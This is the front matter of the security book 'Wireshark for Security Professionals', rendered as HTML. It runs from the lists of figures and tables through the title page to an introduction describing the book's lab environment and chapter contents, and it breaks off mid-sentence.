style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >fields</span></u></a></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p></div>
<span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><br clear=all style='page-break-before:always;mso-break-type:section-break'></span>
<div class="Section10" ><p class=MsoBodyText  style="margin-top:3.7500pt;margin-right:154.1000pt;margin-left:53.0000pt;line-height:145%;" ><span><a href="#_bookmark649" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 8-8: Sample protocol hexdump</span></u></a></span><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-size:15.0000pt;" >&nbsp;</span><span><a href="#_bookmark657" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 8-9: Tree items in Wireshark</span></u></a></span><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-size:15.0000pt;" >&nbsp;</span><span><a href="#_bookmark664" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 8-10: Running direction script</span></u></a></span><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-size:15.0000pt;" >&nbsp;</span><span><a href="#_bookmark668" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 8-11: Finding a suspicious packet</span></u></a></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><h2 style="margin-top:12.1000pt;" ><b><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-size:19.5000pt;" >List of Tables</span></b><b><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-size:19.5000pt;" ><o:p></o:p></span></b></h2><p class=MsoBodyText  style="margin-top:9.8500pt;margin-right:207.6000pt;margin-left:53.0000pt;text-indent:-22.5000pt;line-height:145%;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Chapter 1: Introducing Wireshark </span><span><a href="#_bookmark37" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Table 1-1: Comparison Operators</span></u></a></span><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-size:15.0000pt;" >&nbsp;</span><span><a href="#_bookmark45" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Table 1-2: Logical Operators</span></u></a></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.1000pt;margin-left:30.5000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Chapter 4: Capturing Packets</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.7000pt;margin-right:52.5000pt;margin-left:30.5000pt;text-indent:22.5000pt;line-height:145%;" ><span><a href="#_bookmark311" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Table 4-1: Common Wireshark Capture File Formats</span></u></a></span><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-size:15.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Chapter 5: Diagnosing Attacks</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.1000pt;margin-left:53.0000pt;" ><span><a href="#_bookmark388" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Table 5-1: Exploit Options</span></u></a></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.7000pt;margin-left:53.0000pt;" ><span><a href="#_bookmark430" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Table 5-2: Well-Known DoS Tools</span></u></a></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p></div>
<span style="mso-spacerun:'yes';font-family:Georgia;font-size:10.0000pt;" ><br clear=all style='page-break-before:always;mso-break-type:section-break'></span>
<div class="Section11" ><p class=MsoBodyText  style="margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:10.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoBodyText  style="margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:10.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoBodyText  style="margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:10.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoBodyText  style="margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:10.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoBodyText  style="margin-top:0.5000pt;margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:12.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal  style="margin-top:4.4000pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;" ><a name="Title Page" ></a><b><span style="mso-spacerun:'yes';font-family:Arial;mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;font-weight:bold;font-size:30.0000pt;" ><a name="_bookmark1" ></a>Wireshark</span></b><b><span style="mso-spacerun:'yes';font-family:Arial;mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;font-weight:bold;font-size:24.5000pt;position:relative;top:-10.5000pt;mso-text-raise:10.5000pt;" >&#174; </span></b><b><span style="mso-spacerun:'yes';font-family:Arial;mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;font-weight:bold;font-size:30.0000pt;" >for Security Professionals</span></b><b><span style="mso-spacerun:'yes';font-family:Arial;mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;font-weight:bold;font-size:30.0000pt;" ><o:p></o:p></span></b></p><p class=MsoBodyText  style="margin-top:0.2500pt;margin-left:0.0000pt;" ><b><span style="mso-spacerun:'yes';font-family:Arial;mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-weight:bold;font-size:32.5000pt;" ><o:p>&nbsp;</o:p></span></b></p><h1 style="margin-top:0.0000pt;" ><b><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-size:24.5000pt;" >Using Wireshark and the Metasploit</span></b><b><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-size:19.5000pt;position:relative;top:-9.0000pt;mso-text-raise:9.0000pt;" >&#174; </span></b><b><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-size:24.5000pt;" >Framework</span></b><b><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-size:24.5000pt;" ><o:p></o:p></span></b></h1><p class=MsoBodyText  style="margin-top:0.1000pt;margin-left:0.0000pt;" ><b><span style="mso-spacerun:'yes';font-family:Arial;mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-weight:bold;font-size:38.0000pt;" ><o:p>&nbsp;</o:p></span></b></p><p class=MsoBodyText  style="margin-right:378.8000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Jessey Bullock Jeff T. Parker</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:10.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoBodyText  style="margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:10.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoBodyText  style="margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:10.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoBodyText  style="margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:10.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoBodyText  style="margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:10.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoBodyText  style="margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:10.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoBodyText  style="margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:10.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoBodyText  style="margin-top:0.5000pt;margin-left:0.0000pt;" ><span><table cellpadding="0"  cellspacing="0" ><tr><td width="120"  height="0" ></td></tr><tr><td></td><td><img width="180"  height="39"  src="Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker.files/Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker15617.png" ></td></tr></table></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:10.0000pt;" ><o:p>&nbsp;</o:p></span></p></div>
<span style="mso-spacerun:'yes';font-family:Georgia;font-size:10.0000pt;" ><br clear=all style='page-break-before:always;mso-break-type:section-break'></span>
<div class="Section12" ><p class=MsoBodyText  style="margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:10.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoBodyText  style="margin-top:0.5000pt;margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:9.0000pt;" ><o:p>&nbsp;</o:p></span></p><h1><a name="Introduction" ></a><b><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-size:24.5000pt;" ><a name="_bookmark2" ></a>Introduction</span></b><b><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-size:24.5000pt;" ><o:p></o:p></span></b></h1><p class=MsoBodyText  style="margin-top:15.5500pt;margin-right:11.1500pt;" ><a name="_bookmark3" ></a><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Welcome to </span><i><span style="mso-spacerun:'yes';font-family:Georgia;font-style:italic;font-size:15.0000pt;" >Wireshark for Security Professionals</span></i><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >. This was an exciting book for us to write. A combined effort of a few people with varied backgrounds&#8212;spanning information security, software development, and online virtual lab development and teaching&#8212;this book should appeal and relate to many people.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.7000pt;margin-right:6.3500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Wireshark is </span><i><span style="mso-spacerun:'yes';font-family:Georgia;font-style:italic;font-size:15.0000pt;" >the </span></i><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >tool for capturing and analyzing network traffic. Originally named Ethereal but changed in 2006, Wireshark is well established and respected among your peers. But you already knew that, or why would you invest your time and money in this book? What you&#8217;re really here for is to delve into how Wireshark makes your job easier and your skills more effective.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p></div>
<span style="mso-spacerun:'yes';font-family:Georgia;font-size:10.0000pt;" ><br clear=all style='page-break-before:always;mso-break-type:section-break'></span>
<div class="Section13" ><p class=MsoBodyText  style="margin-top:0.4500pt;margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:10.0000pt;" ><o:p>&nbsp;</o:p></span></p><h2 style="margin-top:4.4000pt;" ><a name="_bookmark4" ></a><b><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-size:19.5000pt;" ><a name="Overview of the Book and Technology" ></a>Overview of the Book and Technology</span></b><b><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-size:19.5000pt;" ><o:p></o:p></span></b></h2><p class=MsoBodyText  style="margin-top:9.8500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >This book hopes to meet three goals:</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.7000pt;margin-left:30.5000pt;" ><span style="position:absolute;z-index:1;margin-left:133.0833px;margin-top:23.8333px;width:9.0000px;height:9.0000px;" ><img width="9"  height="9"  src="Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker.files/Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker16386.png" ></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Broaden the information security professional&#8217;s skillset through Wireshark.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.5500pt;margin-left:30.5000pt;" ><span style="position:absolute;z-index:1;margin-left:133.0833px;margin-top:23.5833px;width:9.0000px;height:9.0000px;" ><img width="9"  height="9"  src="Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker.files/Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker16463.png" ></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Provide learning resources, including labs and exercises, to apply what you learn.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.6000pt;margin-left:30.5000pt;" ><span style="position:absolute;z-index:1;margin-left:133.0833px;margin-top:23.6667px;width:9.0000px;height:9.0000px;" ><img width="9"  height="9"  src="Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker.files/Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker16547.png" ></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Demonstrate how Wireshark helps with real-life scenarios through Lua scripting.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.5500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >The book isn&#8217;t only for reading; it&#8217;s for doing. Any Wireshark book can show how wonderful Wireshark can be, but this book also gives you opportunities to practice the craft, hone your skills, and master the features Wireshark offers.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.6500pt;margin-right:11.1500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >These opportunities come in a few forms. First, to apply what&#8217;s in the text, you will practice in labs. You build the lab environment early on the book and put it to use throughout the chapters that follow. The second opportunity <a name="_bookmark5" ></a>for practice is at the end of each chapter, save the last Lua scripting chapter. The end-of-chapter exercises largely build on the labs to challenge you again, but with far less hand-holding.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.2500pt;margin-right:52.5000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Between the labs and exercises, your time spent with Wireshark ensures time spent reading is not forgotten.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.5500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >The lab environment was created using containerization technology, resulting in a fairly lightweight virtual environment to be installed and run on your own system. The whole environment was designed specifically for you, the book reader, to practice the book&#8217;s content.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.1500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >These labs were developed and are maintained by one of the authors, Jessey Bullock. The source code for the labs is available online. See </span><span><a href="#_bookmark56" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Chapter 2</span></u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-size:15.0000pt;" >&nbsp;</span></a></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >for specifics.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.6000pt;margin-right:11.1500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >In short, this book is a hands-on, practice-oriented Wireshark guide created for you, the information security professional. The exercises will help you to keep you advancing your Wireshark expertise long after the last page.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p></div>
<span style="mso-spacerun:'yes';font-family:Georgia;font-size:10.0000pt;" ><br clear=all style='page-break-before:always;mso-break-type:section-break'></span>
<div class="Section14" ><p class=MsoBodyText  style="margin-top:0.4500pt;margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:10.0000pt;" ><o:p>&nbsp;</o:p></span></p><h2 style="margin-top:4.4000pt;" ><a name="_bookmark6" ></a><b><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-size:19.5000pt;" ><a name="How This Book Is Organized" ></a>How This Book Is Organized</span></b><b><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-size:19.5000pt;" ><o:p></o:p></span></b></h2><p class=MsoBodyText  style="margin-top:9.8500pt;margin-right:9.3500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >The book is structured on the assumption that readers will start from the beginning and then work through the main content. The initial three chapters not only introduce the title application Wireshark but also the technology to be used for the labs, along with the basic concepts required of the reader. Readers already familiar with Wireshark should still work through the lab setup chapter, since</span><span style="mso-spacerun:'yes';font-family:Georgia;letter-spacing:-2.2000pt;font-size:15.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >future chapters depend on the work being done. These first three chapters are necessary to cover first, before putting the following chapters to use.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.8000pt;margin-right:11.1500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >The majority of the book that follows is structured to discuss Wireshark in the context of information security. Whether capturing, analyzing, or confirming attacks, the book&#8217;s main content and its labs are designed to most benefit information security professionals.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.6500pt;margin-right:11.1500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >The final chapter is built around the scripting language Lua. Lua greatly increases Wireshark&#8217;s flexability as an already powerful network analyzer. Initially, the Lua scripts were scattered thoughout chapters, but they were later combined into a single chapter all their own. It was also appreciated that not all readers are coders, so Lua scripts are better served through one go-to resource.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.7500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Here&#8217;s a summary of the book&#8217;s contents:</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.7000pt;" ><span><a href="#_bookmark14" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Chapter</span></u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-size:15.0000pt;" >&nbsp;</span><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >1</span></u></a></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >, &#8220;Introducing Wireshark,&#8221; is best for the professional with little to no experience with Wireshark. The main goal is to help you avoid being overwhelmed, introduce the interface, and show how Wireshark can be your friend.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.6500pt;" ><span><a href="#_bookmark56" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Chapter 2</span></u></a></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >, &#8220;Setting Up the Lab,&#8221; is not to be skipped. Starting with setting up a virtualized machine, this chapter then sets up the W4SP Lab, which you will use several times in upcoming chapters.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.6000pt;margin-right:11.1500pt;" ><span><a href="#_bookmark198" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Chapter 3</span></u></a></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >, &#8220;The Fundamentals,&#8221; covers basic concepts and is divided into three parts: networking, information security, and packet analysis. The book assumes most readers might be familiar with at least one or two areas, but the chapter makes no assumptions.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p></div>
<span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><br clear=all style='page-break-before:always;mso-break-type:section-break'></span>
<div class="Section15" ><p class=MsoBodyText  style="margin-top:3.7500pt;" ><a name="_bookmark7" ></a><span><a href="#_bookmark237" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Chapter 4</span></u></a></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >, &#8220;Capturing Packets,&#8221; discusses network captures, or the recording of network packets. We take a deep dive into how Wireshark captures, manipulates capture files, and interprets the packets. There&#8217;s also a discussion around working with the variety of devices you encounter on a network.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.6500pt;" ><span><a href="#_bookmark368" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Chapter 5</span></u></a></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >, &#8220;Diagnosing Attacks,&#8221; makes good use of the W4SP Lab, re- creating various attacks commonly seen in the real world. Man in the middle attacks, spoofing various services, denial of service attacks and more are all discussed.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.6500pt;margin-right:11.1500pt;" ><span><a href="#_bookmark455" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Chapter 6</span></u></a></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >, &#8220;Offensive Wireshark,&#8221; also covers malicous traffic, but from the hacker&#8217;s perspective. Wireshark and the W4SP Lab are again relied on to launch, debug, and understand exploits.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.6000pt;margin-right:6.3500pt;" ><span><a href="#_bookmark532" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Chapter 7</span></u></a></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >, &#8220;Decrypting TLS, Capturing USB, Keyloggers, and Network Graphing,&#8221; is a mash-up of more activities as we leverage Wireshark. From decrypting SSL/TLS traffic to capturing USB traffic across multiple platforms, this chapter promises to demonstrate something you can use wherever you work or play.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.7000pt;margin-right:11.1500pt;" ><span><a href="#_bookmark601" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Chapter 8</span></u></a></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >, &#8220;Scripting with Lua,&#8221; contains about 95% of the book&#8217;s script content. It starts simple with scripting concepts and Lua setup, whether you&#8217;re working on Windows or Linux. Scripts start with &#8220;Hello, World&#8221; but lead to packet counting and far more complex topics. Your scripts will both enhance the Wireshark graphic interface and run from the command line.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.3500pt;margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:17.0000pt;" ><o:p>&nbsp;</o:p></span></p><h2><a name="_bookmark8" ></a><b><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-size:19.5000pt;" ><a name="Who Should Read This Book" ></a>Who Should Read This Book</span></b><b><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-size:19.5000pt;" ><o:p></o:p></span></b></h2><p class=MsoBodyText  style="margin-top:9.8500pt;margin-right:8.2500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >To claim this book is for security professionals might be specific enough to the general IT crowd. However, to most information security professionals, it&#8217;s still too broad a category. Most of us specialize in some way or another, and identify ourselves by our role</span><span style="mso-spacerun:'yes';font-family:Georgia;letter-spacing:-2.0000pt;font-size:15.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >or current passion. Some examples include firewall administrator, network security engineer, malware analyst, and incident</span><span style="mso-spacerun:'yes';font-family:Georgia;letter-spacing:-1.5000pt;font-size:15.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >responder.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.7500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Wireshark is not limited to just one or two of those roles. The need for Wireshark can be found in roles such as penetration tester or ethical hacker&#8212;roles defined by being proactive and engaging. Additional</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p></div>
<span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><br clear=all style='page-break-before:always;mso-break-type:section-break'></span>
<div class="Section16" ><p class=MsoBodyText  style="margin-top:3.9500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >roles like forensics analyst, vulnerability tester, and developer also benefit from being familiar with Wireshark. We&#8217;ll show this through examples in the book.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.4000pt;margin-right:11.1500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Regarding expectations on the reader, the book makes no assumptions. Information security specializations vary enough so that someone with 15 years of experience in one field is likely a novice in other fields. Wireshark offers value for anyone in those fields, but it does expect a basic understanding of networking, security and how protocols work. </span><span><a href="#_bookmark198" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Chapter 3</span></u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-size:15.0000pt;" >&nbsp;</span></a></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >ensures we&#8217;re all on the same page.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.7000pt;margin-right:11.1500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Any reader must be technically savy enough to install software or understand systems are networked. And since the book targets security professionals, we presume a fundamental level for information security. Still, as far as <a name="_bookmark9" ></a>&#8220;fundamentals&#8221; go, </span><span><a href="#_bookmark198" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) 